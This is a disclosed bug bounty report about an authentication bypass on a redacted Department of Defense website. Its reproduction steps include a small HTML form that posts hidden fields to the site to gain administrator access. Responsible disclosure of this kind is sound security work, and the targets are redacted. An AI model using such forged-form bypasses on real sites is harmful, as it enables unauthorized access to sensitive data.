---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1146600'
original_report_id: '1146600'
title: Administration Authentication Bypass on https://█████
weakness: Improper Authentication - Generic
team_handle: deptofdefense
created_at: '2021-04-02T23:46:59.304Z'
disclosed_at: '2021-04-20T19:34:47.351Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 13
tags:
- hackerone
- improper-authentication-generic
---

# Administration Authentication Bypass on https://█████

## Metadata

- HackerOne Report ID: 1146600
- Weakness: Improper Authentication - Generic
- Program: deptofdefense
- Disclosed At: 2021-04-20T19:34:47.351Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi there
I found a way to connect to an administration space on your website https://██████████

#how to reproduce ?

1) - go to this link : https://███/██████████
2) - create a html file with : 
```html
<form action="https://████████/██████████" method="post">
    <input type="hidden" name="█████" value="">
    <input type="hidden" name="█████" value="1">
    <input type="submit">
</form>
```
3) - launch the file, click on the button and return to the page https://███████/█████
4) - refresh the page and you have access to the administration

POC : 

██████████

if you need more information, contact me

best regards,
fiveguyslover

## Impact

access to sensitive data and the ability to modify information.

## System Host(s)
█████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1) - go to this link : https://█████/███████
2) - create a html file with : 
```html
<form action="https://█████/███" method="post">
    <input type="hidden" name="███" value="">
    <input type="hidden" name="████" value="1">
    <input type="submit">
</form>
```
3) - launch the file, click on the button and return to the page https://██████/█████
4) - refresh the page and you have access to the administration

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
